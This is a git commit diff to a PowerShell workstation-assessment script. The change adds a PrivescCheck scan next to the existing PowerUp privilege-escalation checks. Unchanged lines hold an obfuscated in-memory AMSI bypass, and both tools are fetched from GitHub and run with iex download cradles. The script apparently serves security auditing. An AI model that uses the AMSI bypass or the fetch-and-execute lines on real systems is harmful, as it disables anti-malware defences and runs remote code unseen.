df88187ceb4619250d7105b6942a07d4da54d624
Michael Ritter <info@michi-ritter.de>
2022-03-03 15:26:55 +0100

    Added new syntax for PowerUp and additionally implemented Invoke-PrivEscCheck

--- Invoke-WorkstationAssessment.ps1
+++ Invoke-WorkstationAssessment.ps1
@@ -8,7 +8,12 @@ Start-Transcript -path ".\Invoke-WorkstatationAssessment.log" -append
 
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 iex(New-Object Net.WebClient).DownloadString("https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1")
-Invoke-AllChecks -ErrorAction SilentlyContinue -HTMLReport
+Invoke-PrivescAudit -ErrorAction SilentlyContinue -HTMLReport
+
+iex(New-Object Net.WebClient).DownloadString("https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1")
+Invoke-PrivescCheck -Report PrivescCheck_$env:computername -Format TXT,CSV,HTML,XML -Extended
+
+
 
 Function Get-BadPrivilege
 {
